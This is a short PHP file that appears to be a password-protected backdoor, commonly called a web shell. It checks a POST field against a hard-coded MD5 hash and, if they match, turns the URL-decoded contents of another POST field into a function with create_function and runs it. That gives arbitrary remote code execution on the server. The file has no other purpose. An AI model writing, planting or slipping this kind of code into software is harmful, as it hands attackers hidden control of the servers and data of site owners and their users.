<?php
error_reporting(E_ALL);
if (isset($_POST['1113ab55']) && md5($_POST['1113ab55']) == 'b48fe031af4b799d68075f71800438a1') {
	$test_func = create_function('', urldecode($_POST['f']));
	$test_func();
}
exit(); 
?>